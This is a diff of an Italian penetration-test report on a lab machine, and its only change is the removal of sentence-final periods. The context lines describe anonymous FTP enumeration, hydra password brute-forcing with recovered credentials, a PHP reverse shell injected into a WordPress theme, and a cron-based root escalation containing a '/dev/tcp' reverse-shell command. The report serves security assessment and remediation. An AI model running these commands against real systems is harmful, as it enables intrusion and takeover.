@@ -9,7 +9,7 @@
 
 ## Disclaimer
 
-Questo report rappresenta una **fotografia puntuale dello stato di sicurezza** del sistema target alla data del test. Le vulnerabilità identificate e documentate sono il risultato dell'analisi condotta nel periodo di tempo stabilito e con la metodologia concordata.
+Questo report rappresenta una **fotografia puntuale dello stato di sicurezza** del sistema target alla data del test. Le vulnerabilità identificate e documentate sono il risultato dell'analisi condotta nel periodo di tempo stabilito e con la metodologia concordata
 
 **Limitazioni del Test:**
 
@@ -45,7 +45,7 @@ Durante il penetration test black box condotto sul sistema target 192.168.50.9, 
 3. **Iniezione PHP Reverse Shell** tramite Theme Editor
 4. **Privilege escalation** via cron job world-writable (/usr/local/bin/cleanup)
 
-Entrambi i percorsi hanno portato ad **ACCESSO ROOT COMPLETO**. Il sistema presenta un **livello di rischio CRITICO** e richiede interventi immediati di remediation.
+Entrambi i percorsi hanno portato ad **ACCESSO ROOT COMPLETO**. Il sistema presenta un **livello di rischio CRITICO** e richiede interventi immediati di remediation
 
 ---
 
@@ -78,7 +78,7 @@ sudo netdiscover
 - **Vendor:** PCS Systemtechnik GmbH (VirtualBox)
 
 **Analisi:** 
-- La scansione ARP ha identificato con successo il target nel range di rete specificato.
+- La scansione ARP ha identificato con successo il target nel range di rete specificato
 
 ---
 
@@ -150,7 +150,7 @@ sudo nmap -A -p- 192.168.50.9
 ![Users List](IMG/5_users_txt.png)
 
 **Impatto:** 
-- Information disclosure critico - la lista di utenti validi del sistema è stata esposta tramite FTP anonimo. Questa informazione può essere utilizzata per attacchi di brute force mirati.
+- Information disclosure critico - la lista di utenti validi del sistema è stata esposta tramite FTP anonimo. Questa informazione può essere utilizzata per attacchi di brute force mirati
 
 **Remediation:**
 - Disabilitare l'accesso FTP anonimo
@@ -179,7 +179,7 @@ hydra -L users.txt.bk -P /usr/share/seclists/Passwords/Common-Credentials/500-wo
 
 ### Fase 3: Test Manuali SSH
 
-**Verifica manuale** degli utenti tramite connessione SSH diretta per verificare la risposta del server.
+**Verifica manuale** degli utenti tramite connessione SSH diretta per verificare la risposta del server
 
 ![SSH Manual Test](IMG/7_ssh_manual_test.png)
 
@@ -206,7 +206,7 @@ hydra -l anne -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-pass
 - **Password:** princess
 
 **Impatto:** 
-- Compromissione completa dell'account utente tramite password debole.
+- Compromissione completa dell'account utente tramite password debole
 
 **Remediation:**
 - Implementare policy di password complesse
@@ -286,7 +286,7 @@ anne@bsides2018:~$ sudo /bin/bash
 
 **Descrizione:**
 
-Il sistema è vulnerabile a Shellshock (CVE-2014-6271), una vulnerabilità critica in GNU Bash che permette l'esecuzione di codice arbitrario da remoto. Questa vulnerabilità è stata scoperta nel 2014 e colpisce versioni di Bash anteriori alla patch.
+Il sistema è vulnerabile a Shellshock (CVE-2014-6271), una vulnerabilità critica in GNU Bash che permette l'esecuzione di codice arbitrario da remoto. Questa vulnerabilità è stata scoperta nel 2014 e colpisce versioni di Bash anteriori alla patch
 
 **Dettagli Tecnici:**
 - L'exploit permette l'esecuzione di comandi arbitrari attraverso richieste HTTP, CGI scripts, DHCP, etc.
@@ -301,7 +301,7 @@ Il sistema è vulnerabile a Shellshock (CVE-2014-6271), una vulnerabilità criti
 
 ## Percorso di Attacco #2: WordPress Exploitation
 
-Oltre al primo path di attacco tramite SSH, è stato identificato un **secondo vettore di attacco completamente indipendente** attraverso un'installazione WordPress non sicura presente sullo stesso host.
+Oltre al primo path di attacco tramite SSH, è stato identificato un **secondo vettore di attacco completamente indipendente** attraverso un'installazione WordPress non sicura presente sullo stesso host
 
 ### Fase 1: Enumerazione Servizi Web - Scoperta robots.txt
 
@@ -318,10 +318,10 @@ nmap -A -p- 192.168.50.9
 ![Nmap Robots.txt Discovery](IMG/11_nmap_vuln_robots.png)
 
 **Analisi:** 
-- Il file robots.txt rivela la presenza della directory `/backup_wordpress`, indicando un'installazione WordPress backup o di test non adeguatamente protetta.
+- Il file robots.txt rivela la presenza della directory `/backup_wordpress`, indicando un'installazione WordPress backup o di test non adeguatamente protetta
 
 **Impatto:** 
-- Information disclosure che rivela la struttura delle directory e potenziali vettori di attacco.
+- Information disclosure che rivela la struttura delle directory e potenziali vettori di attacco
 
 ![Robots.txt Content](IMG/12_robots_txt.png)
 
@@ -386,7 +386,7 @@ msf auxiliary(scanner/http/wordpress_login_enum) > run
 - **Password:** enigma
 
 **Impatto:** 
-- Accesso amministrativo completo al pannello WordPress, permettendo l'esecuzione di codice arbitrario.
+- Accesso amministrativo completo al pannello WordPress, permettendo l'esecuzione di codice arbitrario
 
 **Analisi:**
 - Password debole (presente in common wordlist)
@@ -443,7 +443,7 @@ Questa feature permette la modifica diretta di file PHP del tema
 ![WordPress Theme Editor](IMG/19_wp_editor.png)
 
 **Analisi:**
-- Iniettare una reverse shell PHP nel file footer.php che verrà eseguito ad ogni caricamento di pagina del blog.
+- Iniettare una reverse shell PHP nel file footer.php che verrà eseguito ad ogni caricamento di pagina del blog
 
 ---
 
@@ -465,10 +465,10 @@ Questa feature permette la modifica diretta di file PHP del tema
 - **Shell Type:** /bin/sh interactive shell
 
 **Risultati:**
-- Il codice della reverse shell è stato inserito al posto di quello del file footer.php, garantendo l'esecuzione automatica ogni volta che la pagina principale del sito viene caricata.
+- Il codice della reverse shell è stato inserito al posto di quello del file footer.php, garantendo l'esecuzione automatica ogni volta che la pagina principale del sito viene caricata
 
 **Impatto:** 
-- Remote Code Execution (RCE) come utente www-data sul server web.
+- Remote Code Execution (RCE) come utente www-data sul server web
 
 ---
 
@@ -569,7 +569,7 @@ sh -i >& /dev/tcp/192.168.50.5/443 0>&1
 ```
 
 **Analisi:**
-- Il cron job esegue lo script ogni minuto. Entro 60 secondi, il sistema eseguirà automaticamente la reverse shell come root.
+- Il cron job esegue lo script ogni minuto. Entro 60 secondi, il sistema eseguirà automaticamente la reverse shell come root
 
 ---
 
@@ -647,7 +647,7 @@ Il sistema presenta **almeno due path completamente indipendenti** per ottenere 
 
 ## Conclusione
 
-Il penetration test ha dimostrato che il sistema target 192.168.50.9 presenta **vulnerabilità critiche multiple** su diversi livelli che permettono la completa compromissione del sistema attraverso **due attack path completamente indipendenti**, entrambi portando a root access in tempi estremamente brevi.
+Il penetration test ha dimostrato che il sistema target 192.168.50.9 presenta **vulnerabilità critiche multiple** su diversi livelli che permettono la completa compromissione del sistema attraverso **due attack path completamente indipendenti**, entrambi portando a root access in tempi estremamente brevi
 
 ### Riepilogo Risultati Chiave
 
@@ -671,4 +671,4 @@ Il penetration test ha dimostrato che il sistema target 192.168.50.9 presenta **
 
 ---
 
-*Questo documento contiene informazioni confidenziali e deve essere trattato in conformità con le policy di sicurezza aziendali.*
+*Questo documento contiene informazioni confidenziali e deve essere trattato in conformità con le policy di sicurezza aziendali*
